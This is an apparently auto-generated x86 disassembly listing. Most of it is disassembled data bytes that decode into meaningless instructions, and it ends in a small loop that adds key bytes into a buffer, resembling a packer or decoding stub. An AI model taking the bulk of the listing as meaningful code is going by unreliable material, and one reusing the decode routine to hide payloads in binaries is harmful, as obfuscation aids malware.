  417ac0:	cmp    DWORD PTR [edx-0x5321412b],0x4e
  417ac7:	in     al,dx
  417ac8:	je     0x417b3c
  417aca:	xor    dl,BYTE PTR [esi+0x5a]
  417acd:	leave  
  417ace:	clc    
  417acf:	stc    
  417ad0:	adc    BYTE PTR [esi],ch
  417ad2:	addr16 xchg edx,eax
  417ad4:	jle    0x417b07
  417ad6:	add    DWORD PTR ds:0x4f72d2e4,esi
  417adc:	retf   0x7291
  417adf:	rcl    DWORD PTR [ecx],cl
  417ae1:	div    BYTE PTR [ebp+0x5c78ae08]
  417ae7:	test   al,0x1c
  417ae9:	int3   
  417aea:	mov    al,ds:0xade47ad7
  417aef:	test   eax,0x77855dc0
  417af4:	and    eax,0xf98bae20
  417af9:	leave  
  417afa:	adc    DWORD PTR [edi-0x1ea77702],edx
  417b00:	mov    bh,0x87
  417b02:	inc    ebp
  417b03:	sar    DWORD PTR [edi],0x65
  417b06:	jo     0x417ae4
  417b08:	mov    ecx,0xc11dac93
  417b0d:	inc    ebx
  417b0e:	stos   BYTE PTR es:[edi],al
  417b0f:	fimul  DWORD PTR [eax-0x29e296d1]
  417b15:	in     al,dx
  417b16:	dec    esi
  417b17:	inc    edx
  417b18:	jecxz  0x417b70
  417b1a:	hlt    
  417b1b:	nop
  417b1c:	aas    
  417b1d:	popa   
  417b1e:	or     al,0x78
  417b20:	out    dx,eax
  417b21:	stos   BYTE PTR es:[edi],al
  417b22:	pop    edi
  417b23:	adc    ch,BYTE PTR [ebx+0x1662eb9b]
  417b29:	shl    DWORD PTR [edi+0x41],0xc2
  417b2d:	imul   eax,DWORD PTR [ebx+0x55],0x693f58dd
  417b34:	mov    eax,ds:0xb3513286
  417b39:	mov    ecx,0x55e7cbee
  417b3e:	mov    eax,ds:0x8866d751
  417b43:	scas   al,BYTE PTR es:[edi]
  417b44:	push   0x420eda13
  417b49:	sub    ah,dh
  417b4b:	imul   edi,DWORD PTR [edx+0x1d959e51],0x62
  417b52:	xchg   BYTE PTR [esi-0x38],bh
  417b55:	sbb    BYTE PTR [esi+edi*2-0x33],dh
  417b59:	(bad)  
  417b5a:	data16 adc BYTE PTR [ebx],ah
  417b5d:	push   edi
  417b5e:	mov    ah,BYTE PTR [eax+0x5b8533ed]
  417b64:	inc    ebp
  417b65:	aad    0x28
  417b67:	mov    bh,0x31
  417b69:	stos   DWORD PTR es:[edi],eax
  417b6a:	jmp    0x417b8e
  417b6c:	jno    0x417b5c
  417b6e:	or     al,0xda
  417b70:	loope  0x417bd6
  417b72:	inc    ebp
  417b73:	adc    BYTE PTR [ecx+0x5aaa5983],cl
  417b79:	adc    esp,ecx
  417b7b:	lds    esp,FWORD PTR ds:0x2965a677
  417b81:	int    0x29
  417b83:	add    DWORD PTR [ebp-0x2ed9b938],esp
  417b89:	dec    ebx
  417b8a:	pushf  
  417b8b:	pushf  
  417b8c:	push   esi
  417b8d:	add    BYTE PTR [edx+esi*8+0x21],ah
  417b91:	mov    esp,0x8eebf5be
  417b96:	mov    dl,0x1c
  417b98:	push   edi
  417b99:	sbb    esp,ecx
  417b9b:	push   esp
  417b9c:	in     eax,0x1e
  417b9e:	push   ebx
  417b9f:	jecxz  0x417bfd
  417ba1:	cmp    eax,0x8006e85a
  417ba6:	jb     0x417ba9
  417ba8:	mov    al,ds:0x611eb3df
  417bad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bae:	or     eax,0x94921a90
  417bb3:	mov    al,ds:0xfe102fd
  417bb8:	cmp    cl,BYTE PTR [edx]
  417bba:	out    dx,al
  417bbb:	outs   dx,DWORD PTR ds:[esi]
  417bbc:	or     eax,0x502633d3
  417bc1:	(bad)  
  417bc3:	sbb    al,0x7a
  417bc5:	into   
  417bc6:	or     BYTE PTR [eax+0x64],0x45
  417bca:	loopne 0x417c08
  417bcc:	fld    QWORD PTR [esi]
  417bce:	test   DWORD PTR [edx-0x76d613ab],esp
  417bd4:	outs   dx,DWORD PTR ds:[esi]
  417bd5:	push   ecx
  417bd6:	fist   WORD PTR [edx-0x4ea2e0be]
  417bdc:	out    0xee,al
  417bde:	pusha  
  417bdf:	xchg   esp,eax
  417be0:	ja     0x417c1b
  417be2:	neg    BYTE PTR [ebx-0x6c85b1f1]
  417be8:	adc    ah,BYTE PTR [ebx+0x56]
  417beb:	pop    ss
  417bec:	push   ebp
  417bed:	mov    DWORD PTR [ecx+0xd],ebx
  417bf0:	test   DWORD PTR [eax],ebp
  417bf2:	mov    esp,0x5c21c82b
  417bf7:	adc    eax,0xd4d1c93b
  417bfc:	sbb    ebp,ebp
  417bfe:	sub    eax,DWORD PTR [esi]
  417c00:	mov    edi,0xaf67a709
  417c05:	ret    
  417c06:	and    al,cl
  417c08:	aas    
  417c09:	mov    dh,BYTE PTR [edx]
  417c0b:	xchg   ebp,eax
  417c0c:	and    al,0x1e
  417c0e:	or     BYTE PTR [ebx],al
  417c10:	adc    al,0xe6
  417c12:	cli    
  417c13:	ror    BYTE PTR [eax-0x3f],cl
  417c16:	mov    bl,0x90
  417c18:	xchg   esp,eax
  417c19:	cmp    DWORD PTR [ebx],edx
  417c1b:	xchg   esi,eax
  417c1c:	cmp    al,0x4
  417c1e:	pop    esi
  417c1f:	retf   0x8986
  417c22:	rcr    BYTE PTR [ecx],cl
  417c24:	int3   
  417c25:	push   esp
  417c26:	popf   
  417c27:	jecxz  0x417c33
  417c29:	adc    cl,0xdc
  417c2c:	(bad)  
  417c2d:	out    0xf,eax
  417c2f:	mov    esi,DWORD PTR [ebx+ebx*1-0x5e]
  417c33:	jno    0x417bdf
  417c35:	add    edi,edx
  417c37:	fwait
  417c38:	xchg   ecx,eax
  417c39:	xchg   ecx,eax
  417c3a:	inc    edx
  417c3b:	mov    esi,0xc0791ea
  417c40:	push   cs
  417c41:	adc    al,0x43
  417c43:	aad    0xa0
  417c45:	adc    DWORD PTR [eax+edx*2-0x2d],esp
  417c49:	xchg   edi,eax
  417c4a:	jl     0x417c2b
  417c4c:	lods   al,BYTE PTR ds:[esi]
  417c4d:	aam    0xa9
  417c4f:	lock enter 0xb95e,0x82
  417c54:	dec    bp
  417c56:	xchg   ebp,eax
  417c57:	and    eax,0x484b0183
  417c5c:	xchg   esi,eax
  417c5d:	mov    cl,0x7d
  417c5f:	int    0x14
  417c61:	rcl    DWORD PTR [esi-0x44],1
  417c64:	sub    eax,0x7343e4a7
  417c69:	mov    cl,0xc
  417c6b:	jbe    0x417c34
  417c6d:	out    dx,al
  417c6e:	xchg   ebx,eax
  417c6f:	int    0x92
  417c71:	fldenv [eax]
  417c73:	pop    esi
  417c74:	in     eax,0x73
  417c76:	xchg   ebx,eax
  417c77:	add    eax,0xe1a3e15e
  417c7c:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  417c7e:	es jmp 0x906c:0xf46f4564
  417c86:	sub    al,0x68
  417c88:	mov    eax,0xffc1902d
  417c8d:	fadd   QWORD PTR [eax]
  417c8f:	stos   BYTE PTR es:[edi],al
  417c90:	inc    ebp
  417c91:	or     ecx,DWORD PTR [ecx]
  417c93:	mov    esp,0xcfb0b1c7
  417c98:	xor    ebx,DWORD PTR [esi+0x76]
  417c9b:	xchg   ecx,eax
  417c9c:	pusha  
  417c9d:	test   ch,0x44
  417ca0:	inc    ecx
  417ca1:	sub    bh,BYTE PTR [ebp-0xa]
  417ca4:	adc    esp,DWORD PTR [esp+ebx*2-0xf9e60d2]
  417cab:	aaa    
  417cac:	rcl    BYTE PTR [eax-0x1b],1
  417caf:	push   edx
  417cb0:	xchg   esi,eax
  417cb1:	adc    ch,BYTE PTR [esi+0x4c]
  417cb4:	daa    
  417cb5:	mov    BYTE PTR [eax-0x4e26d77f],0xe7
  417cbc:	adc    bh,BYTE PTR [ebx]
  417cbe:	sti    
  417cbf:	jno    0x417c99
  417cc1:	mov    bh,0xd8
  417cc3:	jne    0x417c87
  417cc5:	js     0x417cb4
  417cc7:	or     esp,ecx
  417cc9:	inc    ebp
  417cca:	cmp    al,0xd4
  417ccc:	jb     0x417c61
  417cce:	jmp    0x47dba08d
  417cd3:	test   DWORD PTR [ecx+0x4],edi
  417cd6:	out    0x5b,al
  417cd8:	sbb    edx,ebx
  417cda:	mov    al,ds:0xd0780101
  417cdf:	scas   al,BYTE PTR es:[edi]
  417ce0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ce1:	icebp  
  417ce2:	inc    edx
  417ce3:	rol    DWORD PTR [ecx-0x79609148],0x5f
  417cea:	cld    
  417ceb:	nop
  417cec:	xor    eax,0xb298ca9f
  417cf1:	iret   
  417cf2:	mov    al,0xb1
  417cf4:	(bad)  
  417cf5:	pop    ss
  417cf6:	push   ebx
  417cf7:	pusha  
  417cf8:	sub    al,0xba
  417cfa:	jecxz  0x417cd6
  417cfc:	in     eax,0x3f
  417cfe:	leave  
  417cff:	je     0x417d76
  417d01:	xlat   BYTE PTR ds:[ebx]
  417d02:	mov    gs,ebx
  417d04:	cmp    eax,0xb7d95ed9
  417d09:	in     al,dx
  417d0a:	cmp    BYTE PTR [ecx+0x16],ch
  417d0d:	pop    edx
  417d0e:	pop    ss
  417d0f:	jmp    0x417d3a
  417d11:	mov    bh,0xbb
  417d13:	int3   
  417d14:	hlt    
  417d15:	jge    0x417d36
  417d17:	(bad)  
  417d1a:	mov    WORD PTR [edi+esi*4],cs
  417d1d:	add    DWORD PTR [edx-0x28f32ac2],eax
  417d23:	jmp    0x673c68aa
  417d28:	shr    BYTE PTR [edi+edi*8+0x54],cl
  417d2c:	and    edi,ebx
  417d2e:	sbb    DWORD PTR [ebp+0x57],eax
  417d31:	ins    BYTE PTR es:[edi],dx
  417d32:	das    
  417d33:	dec    esi
  417d34:	jp     0x417d80
  417d36:	mov    ds:0x492707ef,al
  417d3b:	nop
  417d3c:	pop    es
  417d3d:	test   al,0x6f
  417d3f:	ins    DWORD PTR es:[edi],dx
  417d40:	xchg   esi,eax
  417d41:	dec    ecx
  417d42:	int3   
  417d43:	pop    ebx
  417d44:	push   esi
  417d45:	fisub  WORD PTR [ebx+ebx*1+0x71533a8b]
  417d4c:	add    esp,ecx
  417d4e:	mov    bl,0x4f
  417d50:	jp     0x417cdb
  417d52:	lahf   
  417d53:	dec    ebp
  417d54:	inc    eax
  417d55:	leave  
  417d56:	xlat   BYTE PTR ds:[ebx]
  417d57:	jle    0x417d14
  417d59:	mov    ah,0xc
  417d5b:	mov    esp,0xd153a86d
  417d60:	push   0xa2393560
  417d65:	xchg   esp,eax
  417d66:	cmp    al,0x13
  417d68:	push   ebx
  417d69:	call   0x9c37aea0
  417d6e:	push   ebx
  417d6f:	bnd jo 0x417d68
  417d72:	call   0xd95eeb64
  417d77:	xor    edx,ebx
  417d79:	in     eax,dx
  417d7a:	and    ebp,DWORD PTR [eax+0x4c40ad35]
  417d80:	sub    al,0x5a
  417d82:	popf   
  417d83:	xor    BYTE PTR [ebx-0x63],bl
  417d86:	into   
  417d87:	ret    0xfdfd
  417d8a:	lds    esp,FWORD PTR [eax+0x11]
  417d8d:	dec    esp
  417d8e:	cmp    DWORD PTR [eax+0x48bf05df],ebx
  417d94:	lahf   
  417d95:	jp     0x417df9
  417d97:	call   0x1637:0x7d38fac5
  417d9e:	mov    ss,WORD PTR [ecx]
  417da0:	and    eax,0xf5862bd4
  417da5:	mov    BYTE PTR [ebx+0x7e33a455],bl
  417dab:	nop
  417dac:	sub    al,0x60
  417dae:	lods   eax,DWORD PTR ds:[esi]
  417daf:	mov    ebx,0xb79c7e5d
  417db4:	dec    eax
  417db6:	sub    eax,0x65fcfc0
  417dbb:	rcr    BYTE PTR [edx+0x3ed6b63a],0x53
  417dc2:	jge    0x417d8d
  417dc4:	pop    esi
  417dc5:	pop    esi
  417dc6:	cwde   
  417dc7:	sub    DWORD PTR [edi-0x71c6bb51],eax
  417dcd:	inc    ecx
  417dce:	icebp  
  417dcf:	jb     0x417e42
  417dd1:	mov    WORD PTR [eax-0x15],?
  417dd4:	sub    DWORD PTR [ebx-0x35],edx
  417dd7:	dec    ebx
  417dd8:	jno    0x417e4a
  417dda:	iret   
  417ddb:	sub    BYTE PTR [eax-0x68],cl
  417dde:	mov    ebp,0x34dfef6e
  417de3:	inc    edx
  417de4:	fcmovne st,st(5)
  417de6:	fs nop
  417de8:	pop    ds
  417de9:	dec    ebp
  417dea:	cmc    
  417deb:	xor    al,0x77
  417ded:	jns    0x417d7c
  417def:	hlt    
  417df0:	add    eax,0xef770df6
  417df5:	retf   0x1330
  417df8:	mov    eax,ds:0x2a07563f
  417dfd:	loopne 0x417e10
  417dff:	push   es
  417e00:	repnz in al,dx
  417e02:	out    dx,eax
  417e03:	jmp    0x417d90
  417e05:	jne    0x417e03
  417e07:	call   esi
  417e09:	mov    DWORD PTR [ebp-0x3c],eax
  417e0c:	cmp    DWORD PTR [ebp-0x3c],0x57
  417e10:	jne    0x417e1e
  417e12:	mov    edx,DWORD PTR [ebp-0x24]
  417e15:	push   edx
  417e16:	call   0x401000
  417e1b:	add    esp,0x4
  417e1e:	xor    eax,eax
  417e20:	pop    esi
  417e21:	mov    esp,ebp
  417e23:	pop    ebp
  417e24:	ret    
  417e25:	push   ebp
  417e26:	mov    ebp,esp
  417e28:	sub    esp,0x124
  417e2e:	xor    eax,eax
  417e30:	mov    esp,ebp
  417e32:	pop    ebp
  417e33:	ret    
  417e34:	push   ebp
  417e35:	mov    ebp,esp
  417e37:	sub    esp,0x2c
  417e3a:	push   ebx
  417e3b:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  417e42:	mov    DWORD PTR [ebp-0xc],0x0
  417e49:	mov    DWORD PTR [ebp-0x20],0x1
  417e50:	mov    DWORD PTR [ebp-0x10],0x0
  417e57:	mov    eax,DWORD PTR [ebp+0xc]
  417e5a:	mov    DWORD PTR [ebp-0x1c],eax
  417e5d:	mov    DWORD PTR [ebp-0x18],0x0
  417e64:	mov    DWORD PTR [ebp-0x8],0x0
  417e6b:	mov    DWORD PTR [ebp-0x24],0x0
  417e72:	mov    ecx,DWORD PTR [ebp-0x4]
  417e75:	sub    ecx,0x1
  417e78:	mov    DWORD PTR [ebp-0x4],ecx
  417e7b:	mov    edx,DWORD PTR [ebp+0x8]
  417e7e:	mov    DWORD PTR [ebp-0x10],edx
  417e81:	mov    DWORD PTR [ebp-0x28],0x1
  417e88:	mov    eax,DWORD PTR [ebp-0x4]
  417e8b:	add    eax,0x2
  417e8e:	mov    DWORD PTR [ebp-0x4],eax
  417e91:	mov    ecx,DWORD PTR [ebp-0x1c]
  417e94:	add    ecx,DWORD PTR [ebp-0x4]
  417e97:	mov    dl,BYTE PTR [ecx+0x1]
  417e9a:	mov    BYTE PTR [ebp-0x11],dl
  417e9d:	mov    eax,DWORD PTR [ebp-0x4]
  417ea0:	add    eax,0x1
  417ea3:	mov    DWORD PTR [ebp-0x4],eax
  417ea6:	mov    cl,BYTE PTR [ebp-0x11]
  417ea9:	mov    BYTE PTR [ebp-0x29],cl
  417eac:	push   edx
  417ead:	pop    ebx
  417eae:	mov    ecx,ebx
  417eb0:	mov    edx,DWORD PTR [ebp-0x10]
  417eb3:	add    edx,DWORD PTR [ebp-0x4]
  417eb6:	mov    al,BYTE PTR [ebp-0x29]
  417eb9:	mov    BYTE PTR [edx],al
  417ebb:	mov    ebx,esi
  417ebd:	mov    ecx,DWORD PTR [ebp+0x14]
  417ec0:	add    ecx,DWORD PTR [ebp-0x8]
  417ec3:	movzx  edx,BYTE PTR [ecx]
  417ec6:	mov    DWORD PTR [ebp-0xc],edx
  417ec9:	mov    eax,DWORD PTR [ebp-0x8]
  417ecc:	mov    ecx,DWORD PTR [ebp-0x28]
  417ecf:	add    eax,ecx
  417ed1:	mov    DWORD PTR [ebp-0x8],eax
  417ed4:	mov    eax,DWORD PTR [ebp-0x8]
  417ed7:	shr    eax,0x3
  417eda:	mov    ecx,0x1
  417edf:	sub    ecx,eax
  417ee1:	mov    DWORD PTR [ebp-0x20],ecx
  417ee4:	shr    eax,cl
  417ee6:	mov    edx,DWORD PTR [ebp-0x8]
  417ee9:	imul   edx,DWORD PTR [ebp-0x20]
  417eed:	mov    DWORD PTR [ebp-0x8],edx
  417ef0:	shl    ebx,0x3
  417ef3:	mov    eax,DWORD PTR [ebp-0x10]
  417ef6:	add    eax,DWORD PTR [ebp-0x4]
  417ef9:	movzx  ecx,BYTE PTR [eax]
  417efc:	add    ecx,DWORD PTR [ebp-0xc]
  417eff:	mov    edx,DWORD PTR [ebp-0x10]
  417f02:	add    edx,DWORD PTR [ebp-0x4]
  417f05:	mov    BYTE PTR [edx],cl
  417f07:	mov    eax,DWORD PTR [ebp-0x4]
  417f0a:	sub    eax,0x2
  417f0d:	mov    DWORD PTR [ebp-0x4],eax
  417f10:	mov    ecx,DWORD PTR [ebp-0x4]
  417f13:	cmp    ecx,DWORD PTR [ebp+0x10]
  417f16:	jl     0x417e88
  417f1c:	pop    ebx
  417f1d:	mov    esp,ebp
  417f1f:	pop    ebp
  417f20:	ret    
  417f21:	int3   
  417f22:	jmp    DWORD PTR ds:0x418008
